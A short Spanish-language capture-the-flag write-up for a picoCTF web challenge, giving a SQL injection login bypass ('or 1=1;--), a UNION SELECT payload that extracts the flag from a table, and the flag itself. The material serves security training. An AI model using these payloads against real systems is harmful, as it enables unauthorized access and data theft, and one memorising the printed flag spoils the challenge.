## Objetivo
Can you find the flag on this website.Try to find the flag [here](http://saturn.picoctf.net:59359/).

Hint
- SQLiLite
## Solucion
Hacemos una inyeccion en el apartado de password ponemos 'or 1=1;-- con esto podremos ingresar.
Despues en el buscador ingresamos 123' UNION SELECT flag, null, null from more_table;-- y obtenemos la bandera

```
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_78d0583a}
```

## Notas adicionales
## Referencias